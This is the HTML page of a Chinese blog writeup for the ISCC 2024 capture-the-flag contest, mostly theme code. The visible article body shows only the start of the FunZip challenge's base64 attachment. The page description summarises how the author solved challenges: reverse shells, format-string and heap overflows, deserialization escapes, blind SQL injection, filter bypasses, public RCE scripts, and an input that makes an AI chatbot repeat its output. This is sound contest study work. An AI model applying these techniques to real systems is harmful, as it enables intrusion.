<!DOCTYPE html><html lang="zh-CNs" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>ISCC-wp | VV</title><meta name="keywords" content="wp"><meta name="author" content="VVkladg0r"><meta name="copyright" content="VVkladg0r"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="ISCC-wp"><meta name="application-name" content="ISCC-wp"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="ISCC-wp"><meta property="og:url" content="http://cszvvds.cc/2024/05/25/ISCC-wp/index.html"><meta property="og:site_name" content="VV"><meta property="og:description" content="ISCC 2024wp是真的多  MISC练武题FunZip给了附件： VTFSS2MyUldhM2xsUkZaaFVqRlZORmxXWXpWbGJWSkpVMjE0V2xaNlFYSlJNbU01VUZGVTFSS2MyUldhM2xsUkVaaFVqRlZORmw2VGxObFYwWllUbG"><meta property="og:locale" content="zh-CNs"><meta property="og:image" content="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg"><meta property="article:author" content="VVkladg0r"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg"><meta name="description" content="ISCC 2024wp是真的多  MISC练武题FunZip给了附件： VTFSS2MyUldhM2xsUkZaaFVqRlZORmxXWXpWbGJWSkpVMjE0V2xaNlFYSlJNbU01VUZGVTFSS2MyUldhM2xsUkVaaFVqRlZORmw2VGxObFYwWllUbG"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://cszvvds.cc/2024/05/25/ISCC-wp/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  linkPageTop: undefined,
  peoplecanvas: {"enable":true,"img":"https://upload-bbs.miyoushe.com/upload/2023/09/03/125766904/ee23df8517f3c3e3efc4145658269c06_5714860933110284659.png"},
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"VV:QAQ","backTitle":"VV!"},
  LA51: undefined,
  greetingBox: undefined,
  twikooEnvId: '',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: false,
  mainTone: undefined,
  authorStatus: {"skills":null},
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    simplehomepage: true,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: VVkladg0r","link":"链接: ","source":"来源: VV","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: 'VV',
  title: 'ISCC-wp',
  postAI: '',
  pageFillDescription: 'ISCC 2024, MISC, 练武题, FunZip, Number_is_the_key, RSA_KU, 时间刺客, 成语学习, 工业互联网模拟仿真数据分析, 精装四合一, 有人让我给你带个话, 钢铁侠在解密, magic-keyboard, 擂台题, 重隐, Listen_to_a_symphony, World_Line, 数据泄露, RE, 练武题, 迷失之门, Badcode, DLLCode, CrypticConundrum, WinterBegins, Find_All, I_am_the_Mathematician, AI, Which_is_the_flag, 擂台题, 火眼金睛, W2w, ezjs, Ezobf, 国密防线至善之战, web, 练武题, 还没想好名字的塔防游戏, Flask中的pin值计算, 代码审计, 原神启动, 回来吧永远的神, 这题我出不了了, 与时俱进, 掉进阿帕奇工资, 一道普通的XSS题目, 擂台题, 《狂飙》知多少, 最喜欢的一集, mobile, 练武题, Puzzle_Game, ChallengeMobile, ohHELP, 擂台题, 上春山, EzArd, pwn, 练武题, chaos, ISCC_easy, easyshell, miao, Flag, Your_program, ISCC_U, eazy_heap, heapheap, shopping, 擂台题, Curious, unheap, great, babyheap, 实战题, 阶段一是真的多练武题给了附件应该是什么隐写感觉像的用工具所以附件是一个表格但里面没有东西题目描述应该也是隐写术用脚本加粗的单元格已设置为高亮并保存到文件中看上去是空白文件但是这里要缩小看已经缩到最小了还是看不完要调一下行和列可以扫了轩禹梭哈时间刺客两个文件由密码流量文件打开流量分析先执行在跑脚本流量鼠标流量的话改为得到解压密码要全小写解压成语学习又是流量分析找出解压密码明显少了后缀加一个后缀解压找题目名字是成语学习所以我们将成语和英语提出来淡而无味成语是密文英文是密钥工业互联网模拟仿真数据分析打开流量研究后发现第一问的大小不变第二问结果很明显了第三问看文末的流量分组第五组这一组的时间间隔固定第四问看文末的流量分组就能看出这三个是有业务关联性的第五问五个字符的校验算法先假设是或者倒数位必为尝试并尝试为起始位为时成功提交精装四合一四个打开发现这四张图片有共同的部分进制下的及之前的都是相同的于是将这四张图片的这相同的部分删除并与异或跑脚本将这四张图片转成一个压缩包得到一个带密码的压缩包文件使用爆破密码解压将改为解压在文件中发现了一串数字是分解在目录下发现了跑脚本进行解密有人让我给你带个话解压出来两个直接分离出一张名为的图片搭建语音压缩编解码器环境将有人和你说了一些东西解码然后去看文件里面有一个文件然后进行语音识别发现是社会主义核心价值观解码所以钢铁侠在解密直接分离出从中得到和再结合一张小字条跑脚本填入你的之前做过相似的题找不到了找资料的时候也有其他题擂台题重隐两个文件发现图片中藏了一个图片提取解压有密码那我们回头看看音频文件看看用脚本来进行哈希提取得到密码解密对应的音频得到一个文本文件解密发现密文随波逐流解密拿到部分再看音频文件听起来像手机按键声解密然后转九键进行解密得到密码回头解压解密两端连起来两个文件但是发现有密码打开发现头文件是提取出另一张图题目给了猜测反转解压成功用软件识曲得到曲名听到后面有摩斯密码解密所以把四个单词拼接起来两个文件夹在中的拼图文件中在里有个在中的拼图文件中位于括号里就是在中的拼图文件夹的下那个的内容就是在文件中是原题直接拿的脚本梭然后词频一下就可以得到才打了公钥和私钥定义导入公钥与私钥定义替换规则替换编码中的字符反向替换编码中的字符加密函数解密函数主程序省略的长字符串加密数据解密数据数据泄露研究了一下找到了一道相似的题根据这个打选取所有与通信的数据包且大小在以上打开流量导出为纯文本定义文件路径流量流量读取并解析域名转换为字符串写入到文件跑下脚本处理一下查看由此得到原始的工具名为加密练武题迷失之门打开跟进继续跟进转换得到跑脚本输入比较的字符好学的小明又开始学习了他猛猛写了一堆代码并且很高兴实现了功能但是我们发现他的代码写的真的很差这次他又将自己的秘密藏在里面你能揭穿他的秘密吗把附件拉入把数字转成进制跑脚本输入比较的字符一样把附件拖进附件有两个打开同样发现一个数组跑脚本流量打开只有两个函数脱壳再跑脚本流量给了个文件研究一下直接上脚本冻笔新诗懒写寒炉美酒时温醉看墨花月白恍疑雪满前村两个文件要密码打开看下直接跑脚本使用前个斐波那契数作为索引从中提取字符得到跑脚本两个文件直接跑脚本替换你的路径基础库神经网络库图像处理库图像处理库打开后直接跑脚本擂台题火眼金睛解密加密得再解密用的工具将文件转为文和文件编译出文件使用打开函数发现加密特征查看调用可以看见函数对加密后的数据再了一个文件中寻找密文和提取出的密文长度和加密时候的一致为所以加密和解密简单混淆每次从数组里面拿个数运算把满足条件的加入到输出数组输入数组的每个元素都会对应输出数组的个元素属于映射关系直接爆破即可直接手动爆破所以打开研究一些发现关键代码找到密钥密文写个脚本使用更直接地访问和修改类型的值在循环外部通过列表推导式计算避免了每次循环都重新计算合并了最后的打印部分使用列表推导式和函数一次性转换并输出所有解码后的字符串国密防线至善之战打开看看有写个脚本跑一下流量练武题还没想好名字的塔防游戏这是一个还没想好名字的塔防游戏备注格式为其中共有位记得数清楚哦提示在后边哦游戏题应该是题照例找中的根据题目有个字符首页有个大写字母在的提示中也有个大写字母猜测为中的值计算给了一个网页中有个提示随波逐流解码访问海螺这个好像之前做题见到过记不得了随便输一下发现输入会去除输出中的所有代码块格式以纯文本格式输出并且重复一遍得到输出得一个路由访问要内计算写脚本修改为实际网站地址解析并计算结果发现在中访问电子木鱼敲击抓包这个应该是加密我们找找密钥在源码中发现可疑处密钥可能是然后改这样会得到网卡地址和下一关佛曰功德圆满地址机器码提示给你了访问奖品又是解码发现是加密是直接上脚本伪造改这样会给我们一个和然后就是伪造直接打到然后找个版本算脚本算出来填写就有代码审计进入使用这个接口生成一个利用这个直接读文件原神启动进来有熊曰解码页面输入克制属性冰后可以进入许愿拿到访问试下明显是假的最后是回来吧永远的神进来看到提交答案进入隐藏关卡在源码中发现了属性解码隐藏关卡可能是试下直接反弹确保这个库存在且可以导入根据需要定义例如添加等防止请求发送过多大胆这个不会产生回显连接成功直接读和把源码扒下来康康太多了这里就不粘下来了可以找到的相关代码应该是它的加密逻辑直接让解密然后把四段连起来栅栏解密这题我出不了了进来网上查找资料发现有类似的年的直接跑脚本反弹成功与时俱进进来研究一下发现是发现是一个注释的字段并且提示是测试一下发现无回显但是字段会被出来可能是时间盲注测试一下数据库发现默认使用作为数据库直接跑脚本自己的填自己的运行后得到是但是交了不对访问该地址可以下载到了一份源码根目录下有公钥密文文件查看依赖看见审计之后和存在加密解密逻辑但是缺少私钥无法解密猜测私钥存在服务器上研究后发现是开始做的时候在这里卡死了研究了好久可以去查一下这个发现漏洞披露信息显示是搜索相关信息找到一个可用的脚本基于这个脚本我们稍作修改即可使用运行掉进阿帕奇工资进来随便测试一下随便注册一个然后登录不行必须是只是员工的不行回头看我们的注册的地方有一个职级别不能填写现在前端看一下发现被隐藏了抓包手动添加但是还是不行注意我们还有一个信息重置没有用选择邮箱重置不行要选择密保然后登录成功发现随便输下呢试下返回应该是有试下发现执行命令我们通过看猜测在研究一下发现又是是一个的漏洞通过读文件需要读到一道普通的题目研究了一下发现了一道相似的题擂台题狂飙知多少给了一个网页这句话对应台词是你就是个臭卖鱼的我想吃鱼了你就遭老罪喽也是你就是个臭卖鱼的我想吃鱼了你就遭老罪喽然后拿到源码欢迎大家来到本题大家将扮演狂飙中的警察寻找关键证据抓捕犯罪嫌疑人我是一名人民警察打击违法犯罪义不容辞怎么可能这么容易获得呢怎么可能这么容易获得呢差点就让你获得证据了使用和可以找到蛛丝马迹反序列化字符串逃逸字符串逃逸的话是构造也就是每次多个得到结合一下也就是然后就是反序列化的触发差点就让你获得证据了将我们字符串逃逸的结果接到这个后面就行最喜欢的一集进来是访问一下黑名单过滤简单绕过一下出了目录但是禁了一些读文件的命令但是明显没禁完这里我们用命令读练武题附件给了一个文件将文件拖入在源代码中找到关键信息随机数种子编写代码生成对应的随机字节数组然后写脚本生成对应反编译发现是在动态加载然后的混淆方法的返回值下来写个脚本可以跑发现是加密在中跑下脚本调试得密钥输出尝试加载的类名确认找到目标类输出的结果如果或出错输出错误信息最后解密得填入数据打开看下研究下发现会产生空异常跟一下发现返回为同时可以在下找到个对其进行设置返回值后可以看到其在调用的时候退出这时需要我们再次手动设置一下对应的返回值信息然后我们的就不会有错误而退出但是返回的又是现在的一个时间戳需要再次设置一下目标时间然后再次便可以得到写脚本擂台题上春山附件下载下来是一个但是打开出来不行这里我们需要把它改成在里面找到一个文件打开研究了一下写了个脚本手动给赋值为使用分配内存使用获取字符串长度输出拼接后的字符串释放动态分配的内存打开看到这段代码是将时间流转换成字符流调试动态调试得字符串加密异或换位换表然后逐位爆破输出解密字符串定义字符集待解码的消息初始化解码结果列表长度与原消息相同将编码的字符串转换为其十进制表示遍历偏移量尝试解码重新初始化解码结果列表避免之前迭代的影响解码过程合并解码后的字符列表为字符串转换为十进制并尝试打印解码结果更具体的异常处理当字符不在集合中时抛出练武题先看看这个程序是个怎么个事用打开康康呢发现存在函数是在函数进行调用的跟进一下看看这样思路就很清楚了开始申请又释放了一个后面又申请了一个的又将释放的和进行了对比如果相等则会执行后门函数申请的大小可控如果大小为第一个的大小然后发送为其内容即可获得打开看看发现存在字符串漏洞简单看看如果在函数中如果字符串中包含格式化字符串可以控制输入的格式化字符串来达到读取或修改内存的目的而没有函数证明我们需要自己构造可以通过基址进行计算打开发现函数研究一下发现有一个溢出和漏洞并且还有后面函数所以思路就很清楚了先用漏洞使泄露出和地址接着就是打开简单审计后发现有格式化字符串漏洞并且还有栈溢出所以打开发现使格式化字符串看看怎么个事所以我们通过格式化字符串泄露找到地址请选择模式远程攻击本地攻击调试简单看看这个程序发现程序是先进行认证如果输入的的第位为则通过验证然后程序申请了一个堆块位置处指针指向该堆块域这个堆块地址以及地址位置有函数指针该堆块地址处存一个我们输入的长度最大为的然后提供了一个菜单循环执行当选择功能的时候程序会询问你是否真的要退出如果输入则下一次循环结束后结束程序如果输入则在下一次循环后释放指向的堆块所以打开用函数读取存在栈溢出格式化字符串漏洞设置架构和日志级别连接到远程进程加载文件以获取符号信息定义辅助函数地址定义构造利用获取地址计算基址准备格式化字符串攻击清除操作打开申请堆块打印为赋的值同样和的地址通过计算基址来获取打开但是是开了一个沙盒不能直接还有个函数中只能申请大用打然后写入然后用刷新流完成打开发现函数内使用了分配内存但没有检查分配是否成功这样会导致内存泄露同样利用向标准错误输出然后写入最后用刷新流完成打开发现漏洞点在堆输入的时候输入长度的判断导致溢出在上调用了函数指针这样的话思路就很清楚了通过溢出篡改的指针指向溢出修改将上的接到里擂台题没什么好说的一样的看下栈溢出函数所以两个文件研究一下实战题阶段一根据题目下载打开注册一个注册不上发了有可以用的账号要配置好根据题目访问开题是并且版本为这里有显示去搜一下远程代码执行那就根据这篇文章打一下远程代码执行直接向发包添加',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-05-25 23:01:32',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const now = new Date()
          const hour = now.getHours()
          const isNight = hour <= 5 || hour >= 5
          if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
          else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.2.0"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title">VV</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 文章总览</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 全部分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 全部标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言面板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://bu.dusays.com/2024/05/13/6640eacb0aad7.png" target="_blank"><img class="post-qr-code-img" alt="微信" src="https://bu.dusays.com/2024/05/13/6640eacb0aad7.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://bu.dusays.com/2024/05/13/6640eacae5439.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src="https://bu.dusays.com/2024/05/13/6640eacae5439.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/java/" style="font-size: 1.05rem;">java<sup>4</sup></a><a href="/tags/java%E5%AE%89%E5%85%A8/" style="font-size: 1.05rem;">java安全<sup>4</sup></a><a href="/tags/misc/" style="font-size: 1.05rem;">misc<sup>1</sup></a><a href="/tags/web/" style="font-size: 1.05rem;">web<sup>7</sup></a><a href="/tags/wp/" style="font-size: 1.05rem;">wp<sup>7</sup></a><a href="/tags/%E5%85%B6%E4%BB%96/" style="font-size: 1.05rem;">其他<sup>5</sup></a><a href="/tags/%E5%86%85%E7%BD%91/" style="font-size: 1.05rem;">内网<sup>1</sup></a><a href="/tags/%E5%90%8E%E7%AB%AF%E6%BC%8F%E6%B4%9E/" style="font-size: 1.05rem;">后端漏洞<sup>5</sup></a><a href="/tags/%E5%AD%A6%E4%B9%A0/" style="font-size: 1.05rem;">学习<sup>4</sup></a><a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 1.05rem;">工具<sup>2</sup></a><a href="/tags/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/" style="font-size: 1.05rem;">编程语言<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/05/"><span class="card-archive-list-date">May 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">25</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/Writeup/" itemprop="url">Writeup</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/wp/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>wp</span></a></span></div></div><h1 class="post-title" itemprop="name headline">ISCC-wp</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2024-05-25T14:54:33.000Z" title="发表于 2024-05-25 22:54:33">2024-05-25</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2024-05-25T15:01:32.284Z" title="更新于 2024-05-25 23:01:32">2024-05-25</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">15.9k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>84分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="ISCC-wp"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为长沙"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>长沙</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://cszvvds.cc/2024/05/25/ISCC-wp/"><header><a class="post-meta-categories" href="/categories/Writeup/" itemprop="url">Writeup</a><a href="/tags/wp/" tabindex="-1" itemprop="url">wp</a><h1 id="CrawlerTitle" itemprop="name headline">ISCC-wp</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">VVkladg0r</span><time itemprop="dateCreated datePublished" datetime="2024-05-25T14:54:33.000Z" title="发表于 2024-05-25 22:54:33">2024-05-25</time><time itemprop="dateCreated datePublished" datetime="2024-05-25T15:01:32.284Z" title="更新于 2024-05-25 23:01:32">2024-05-25</time></header><h1 id="ISCC-2024"><a href="#ISCC-2024" class="headerlink" title="ISCC 2024"></a>ISCC 2024</h1><p>wp是真的多 </p>
<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="练武题"><a href="#练武题" class="headerlink" title="练武题"></a>练武题</h3><h4 id="FunZip"><a href="#FunZip" class="headerlink" title="FunZip"></a>FunZip</h4><p>给了附件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">VTFSS2MyUldhM2xsUkZaaFVqRlZORmxXWXpWbGJWSkpVMjE0V2xaNlFYSlJNbU01VUZG</span><br><span class="line">VTFSS2MyUldhM2xsUkVaaFVqRlZORmw2VGxObFYwWllUbGMxVVZveU9EbEVVUX</span><br><span class="line">VTFSS2MyUldhM2xsUkVaaFVqRlZORmRVVGs5TlIwNTBZa2hXWVdWcVVreEVWcI</span><br><span class="line">VTFSS2MyUldhM2xsUkVaaFVqRlZORmRVVGs5TlJuWklZa2hhVVZveU9EbEVVUW</span><br><span class="line">VTFSS1UySkdjSFJpU0ZaaFZUQktNRmRXYUc5a1ZXeEZZWHBXVUZWWE9EbEVaQv</span><br><span class="line">VVRKak9WQlJNY0</span><br><span class="line">V2tab1QyTkhTblJaTW1ScFlsVmFNVmRzYUU5a01XeFlWRzE0U2xORk5IZFhhMUo2VTNjeN</span><br><span class="line">VVRKak9WQlJNTm</span><br><span class="line">VjFSS2IyRkhUbkJWYlhCYVZtNVNNRmRXYUc5a1ZtaFdaREprV2sxcmNHbFpiR1JIVGtkS2M6MUVaRVJhZWpBNVJGV6</span><br><span 